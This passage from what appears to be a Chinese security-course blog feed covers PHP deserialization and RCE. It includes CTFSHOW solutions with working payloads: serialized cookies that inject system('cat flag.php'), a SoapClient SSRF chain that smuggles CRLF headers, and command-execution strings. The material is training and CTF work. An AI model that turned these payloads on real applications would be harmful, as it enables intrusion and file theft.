class="string">&quot;&lt;script&gt;alert(&#x27;xiaodi&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2、CTFSHOW-259</p><p>-不存在的方法触发__call</p><p>-无代码通过原生类SoapClient</p><p>-SoapClient使用查询编写利用</p><p>-通过访问本地Flag.php获取Flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、反序列化魔术方法全解&lt;/p&gt;
&lt;p&gt;2、反序列化变量属性全解&lt;/p&gt;
&lt;p&gt;3、反序列化魔术方法原生类&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day45 WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</title>
    <link href="http://example.com/2023/02/03/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <id>http://example.com/2023/02/03/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/</id>
    <published>2023-02-02T17:41:32.000Z</published>
    <updated>2023-02-03T09:42:48.702Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、什么是反序列化操作？-格式转换</p><p>2、为什么会出现安全漏洞？-魔术方法</p><p>3、反序列化漏洞如何发现？ -对象逻辑</p><p>4、反序列化漏洞如何利用？-POP链构造</p><p>补充：反序列化利用大概分类三类</p><p>-魔术方法的调用逻辑-如触发条件</p><p>-语言原生类的调用逻辑-如SoapClient</p><p>-语言自身的安全缺陷-如CVE-2016-7124</p><h3 id="反序列化课程点："><a href="#反序列化课程点：" class="headerlink" title="#反序列化课程点："></a>#反序列化课程点：</h3><p>-PHP&amp;Java&amp;Python</p><p>序列化：对象转换为数组或字符串等格式</p><p>反序列化：将数组或字符串等格式转换成对象</p><p>serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串</p><p>unserialize()   &#x2F;&#x2F;将字符串还原成一个对象</p><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="#PHP反序列化漏洞"></a>#PHP反序列化漏洞</h3><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><h3 id="魔术方法利用点分析："><a href="#魔术方法利用点分析：" class="headerlink" title="#魔术方法利用点分析："></a>#魔术方法利用点分析：</h3><p>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p><p>__construct(): &#x2F;&#x2F;构造函数，当对象new的时候会自动调用</p><p>__destruct()：&#x2F;&#x2F;析构函数当对象被销毁时会被自动调用</p><p>__wakeup(): &#x2F;&#x2F;unserialize()时会被自动调用</p><p>__invoke(): &#x2F;&#x2F;当尝试以调用函数的方法调用一个对象时，会被自动调用</p><p>__call(): &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p><p>__callStatci(): &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p><p>__get(): &#x2F;&#x2F;用于从不可访问的属性读取数据</p><p>__set(): &#x2F;&#x2F;用于将数据写入不可访问的属性</p><p>__isset(): &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</p><p>__unset(): &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</p><p>__toString(): &#x2F;&#x2F;把类当作字符串使用时触发</p><p>sleep(): &#x2F;&#x2F;serialize()函数会检查类中是否存在一个魔术方法 sleep() 如果存在，该方法会被优先调用</p><p><img src="/../images/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/0.png" alt="img"></p><p><img src="/../images/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/0-16754039660173.png" alt="img"></p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 反序列化-魔术方法&amp;漏洞引发&amp;变量修改等</p><p>➢ CTFSHOW-关卡254到260-原生类&amp;POP构造</p><p>➢ CMS代码审计-Typecho反序列化&amp;魔术方法逻辑</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="反序列化-魔术方法-amp-漏洞引发-amp-变量修改等"><a href="#反序列化-魔术方法-amp-漏洞引发-amp-变量修改等" class="headerlink" title="#反序列化-魔术方法&amp;漏洞引发&amp;变量修改等"></a>#反序列化-魔术方法&amp;漏洞引发&amp;变量修改等</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//序列化&amp;反序列化</span><br><span class="line"></span><br><span class="line">class demotest&#123;</span><br><span class="line"></span><br><span class="line">​public $name=&#x27;xiaodi&#x27;;</span><br><span class="line"></span><br><span class="line">​public $sex=&#x27;man&#x27;;</span><br><span class="line"></span><br><span class="line">​public $age=&#x27;29&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$example=new demotest();</span><br><span class="line"></span><br><span class="line">$s=serialize($example);//序列化</span><br><span class="line"></span><br><span class="line">$u=unserialize($s);//反序列化</span><br><span class="line"></span><br><span class="line">echo $s.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">var_dump($u);</span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">//O:8:&quot;demotest&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;xiaodi&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;29&quot;;&#125;</span><br><span class="line"></span><br><span class="line">//object(demotest)#2 (3) &#123; [&quot;name&quot;]=&gt; string(6) &quot;xiaodi&quot; [&quot;sex&quot;]=&gt; string(3) &quot;man&quot; [&quot;age&quot;]=&gt; string(2) &quot;29&quot; &#125;</span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-安全问题"><a href="#x2F-x2F-安全问题" class="headerlink" title="&#x2F;&#x2F;安全问题"></a>&#x2F;&#x2F;安全问题</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class A&#123;</span><br><span class="line"></span><br><span class="line">​public $var=&#x27;echo test&#x27;;</span><br><span class="line"></span><br><span class="line">​    public function test()&#123;</span><br><span class="line"></span><br><span class="line">​        echo $this-&gt;var;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​public function __destruct()&#123;</span><br><span class="line"></span><br><span class="line">​        echo &#x27;x&#x27;.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​public function __construct()&#123;</span><br><span class="line"></span><br><span class="line">​echo &#x27;__construct&#x27;.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">​&#125;</span><br><span class="line"></span><br><span class="line">​public function __toString()&#123;</span><br><span class="line"></span><br><span class="line">​return &#x27;__toString&#x27;.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">​&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//无需函数，创建对象触发魔术方法</span><br><span class="line"></span><br><span class="line">//$a=new A();//触发__construct</span><br><span class="line"></span><br><span class="line">//$a-&gt;test();//触发test</span><br><span class="line"></span><br><span class="line">//echo $a;//触发__toString</span><br><span class="line"></span><br><span class="line">//触发__destruct</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">$t=unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;s:9:&quot;echo test&quot;;&#125;&#x27;);</span><br><span class="line"></span><br><span class="line">$t-&gt;test();</span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-漏洞出现"><a href="#x2F-x2F-漏洞出现" class="headerlink" title="&#x2F;&#x2F;漏洞出现"></a>&#x2F;&#x2F;漏洞出现</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class B&#123;</span><br><span class="line"></span><br><span class="line">​    public function __destruct()&#123;</span><br><span class="line"></span><br><span class="line">​system(&#x27;ipconfig&#x27;);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​public function __construct()&#123;</span><br><span class="line"></span><br><span class="line">​echo &#x27;xiaodisec&#x27;.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">​&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-函数引用，无对象创建触发魔术方法"><a href="#x2F-x2F-函数引用，无对象创建触发魔术方法" class="headerlink" title="&#x2F;&#x2F;函数引用，无对象创建触发魔术方法"></a>&#x2F;&#x2F;函数引用，无对象创建触发魔术方法</h6><p>&#x2F;&#x2F;?x&#x3D;O:1:”B”:1:{s:4:”test”;s:3:”ver”;}</p><p>unserialize($_GET[x]);</p><p>&#x2F;&#x2F;$b&#x3D;new b();</p><p>&#x2F;&#x2F;echo serialize($b);</p><p>class C{</p><p>​public $cmd&#x3D;’ipconfig’;</p><p>​    public function __destruct(){</p><p>​system($this-&gt;cmd);</p><p>​    }</p><p>​public function __construct(){</p><p>​echo ‘xiaodisec’.’<br>‘;</p><p>​}</p><p>}</p><h6 id="x2F-x2F-函数引用，无对象创建触发魔术方法自定义变量"><a href="#x2F-x2F-函数引用，无对象创建触发魔术方法自定义变量" class="headerlink" title="&#x2F;&#x2F;函数引用，无对象创建触发魔术方法自定义变量"></a>&#x2F;&#x2F;函数引用，无对象创建触发魔术方法自定义变量</h6><p>&#x2F;&#x2F;?c&#x3D;O:1:”C”:1:{s:3:”cmd”;s:3:”ver”;}</p><p>unserialize($_GET[c]);</p><p>?&gt;</p><h4 id="CTFSHOW-关卡254到260-原生类-amp-POP构造"><a href="#CTFSHOW-关卡254到260-原生类-amp-POP构造" class="headerlink" title="#CTFSHOW-关卡254到260-原生类&amp;POP构造"></a>#CTFSHOW-关卡254到260-原生类&amp;POP构造</h4><h5 id="254-对象引用执行逻辑"><a href="#254-对象引用执行逻辑" class="headerlink" title="254-对象引用执行逻辑"></a>254-对象引用执行逻辑</h5><p>username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><h5 id="255-反序列化变量修改1"><a href="#255-反序列化变量修改1" class="headerlink" title="255-反序列化变量修改1"></a>255-反序列化变量修改1</h5><p>Code:</p><p>public $isVip&#x3D;true;</p><p>$a&#x3D;new ctfShowUser();</p><p>echo urlencode(serialize($a));</p><p>Get:username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><p>Cookie:user&#x3D;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p><h4 id="256-反序列化参数修改2"><a href="#256-反序列化参数修改2" class="headerlink" title="256-反序列化参数修改2"></a>256-反序列化参数修改2</h4><p>CODE:</p><p>public $username&#x3D;’x’;</p><p>public $password&#x3D;’y’;</p><p>public $isVip&#x3D;true;</p><p>$a&#x3D;new ctfShowUser();</p><p>echo urlencode(serialize($a));</p><p>GET:username&#x3D;x&amp;password&#x3D;y</p><p>COOKIE:user&#x3D;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22x%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22y%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p><h5 id="257-反序列化参数修改-amp-对象调用逻辑"><a href="#257-反序列化参数修改-amp-对象调用逻辑" class="headerlink" title="257-反序列化参数修改&amp;对象调用逻辑"></a>257-反序列化参数修改&amp;对象调用逻辑</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">private</span> <span class="variable">$class</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">​    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET：username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><p>COOKIE：user&#x3D;O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D</p><h5 id="258-反序列化参数修改-amp-对象调用逻辑"><a href="#258-反序列化参数修改-amp-对象调用逻辑" class="headerlink" title="258-反序列化参数修改&amp;对象调用逻辑"></a>258-反序列化参数修改&amp;对象调用逻辑</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">​    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:11&#x27;</span>,<span class="string">&#x27;:+11&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:8&#x27;</span>,<span class="string">&#x27;:+8&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET：username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><p>COOKIE：user&#x3D;O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</p><h5 id="259-原生态类-amp-call魔术方法-amp-配合SSRF"><a href="#259-原生态类-amp-call魔术方法-amp-配合SSRF" class="headerlink" title="259-原生态类&amp;call魔术方法&amp;配合SSRF"></a>259-原生态类&amp;call魔术方法&amp;配合SSRF</h5><p>参考：<a href="https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#Exception">https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#Exception</a></p><p>生成序列化时记得开启SoapClient拓展：php.ini中启用php_soap.dll</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>.<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;ssrf&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">vip=O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>ssrf%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A128%<span class="number">3</span>A%<span class="number">22</span>wupco%<span class="number">0</span>D%<span class="number">0</span>AX-Forwarded-For%<span class="number">3</span>A127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>AContent-Type%<span class="number">3</span>A+application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>AContent-Length%<span class="number">3</span>A+<span class="number">13</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Atoken%<span class="number">3</span>Dctfshow%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h5 id="260-字符串序列化"><a href="#260-字符串序列化" class="headerlink" title="260-字符串序列化"></a>260-字符串序列化</h5><p>ctfshow&#x3D;ctfshow_i_love_36D</p><h4 id="CMS代码审计-Typecho反序列化-amp-魔术方法逻辑"><a href="#CMS代码审计-Typecho反序列化-amp-魔术方法逻辑" class="headerlink" title="#CMS代码审计-Typecho反序列化&amp;魔术方法逻辑"></a>#CMS代码审计-Typecho反序列化&amp;魔术方法逻辑</h4><p><a href="https://www.anquanke.com/post/id/155306">https://www.anquanke.com/post/id/155306</a></p><p>搜反序列化关键字：unserialize</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、什么是反序列化操作？-格式转换&lt;/p&gt;
&lt;p&gt;2、为什么会出现安全漏洞？-魔术方法&lt;/p&gt;
&lt;p&gt;3、反序列化漏洞如</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day44 WEB攻防-通用漏洞&amp;RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用</title>
    <link href="http://example.com/2023/01/31/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2023/01/31/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/</id>
    <published>2023-01-31T09:04:25.000Z</published>
    <updated>2023-02-02T09:19:06.441Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、RCE执行-代码执行&amp;命令执行</p><p>2、CTF考点-漏洞配合&amp;绕过手法</p><p>3、利用审计-CMS框架&amp;中间件等</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><p>1.为什么会产生此类安全问题</p><p>2.此类安全问题探针利用及危害</p><p>3.此类安全问题在CTF即CMS分析</p><p>漏洞场景：代码会调用自身的脚本代码执行，也会调用系统命令执行</p><p>漏洞区别：脚本语言&amp;操作系统(php&#x2F;java&#x2F;python&#x2F;js&amp;windows&#x2F;linux&#x2F;mac)</p><p>漏洞对象：WEB源码&amp;中间件&amp;其他环境（见漏洞详情对象）</p><p>漏洞危害：直接权限丢失,可执行任意脚本代码或系统命令</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ RCE-原理&amp;探针&amp;利用&amp;危害等</p><p>➢ CTF-29~39-RCE代码命令执行</p><p>➢ CMS-PbootCMS审计-RCE执行</p><p>➢ 层面-探针-语言&amp;CMS&amp;中间件等</p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><h4 id="RCE-原理-amp-探针-amp-利用-amp-危害等"><a href="#RCE-原理-amp-探针-amp-利用-amp-危害等" class="headerlink" title="#RCE-原理&amp;探针&amp;利用&amp;危害等"></a>#RCE-原理&amp;探针&amp;利用&amp;危害等</h4><p>举例:</p><?php//eval代码执行eval('phpinfo();');//system命令执行,调用系统的命令执行system('ipconfig');?><p>-RCE代码执行：引用脚本代码解析执行</p><p>-RCE命令执行：脚本调用操作系统命令</p><p>漏洞函数：</p><p>1.PHP：</p><p>eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()以及array_map()等</p><p>system、shell_exec、popen、passthru、proc_open等</p><p>2.Python：</p><p>eval exec subprocess os.system commands </p><p>3.Java：</p><p>Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，</p><p>但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.</p><h4 id="CTF-29-39-RCE代码命令执行"><a href="#CTF-29-39-RCE代码命令执行" class="headerlink" title="#CTF-29~39-RCE代码命令执行"></a>#CTF-29~39-RCE代码命令执行</h4><h6 id="29-通配符"><a href="#29-通配符" class="headerlink" title="29-通配符"></a>29-通配符</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201181934956.png" alt="image-20230201181934956"></p><p>system(‘tac fla*.php’);</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201181750045.png" alt="image-20230201181750045"></p><h6 id="30-取代函数-amp-通配符-amp-管道符"><a href="#30-取代函数-amp-通配符-amp-管道符" class="headerlink" title="30-取代函数&amp;通配符&amp;管道符"></a>30-取代函数&amp;通配符&amp;管道符</h6><p><img 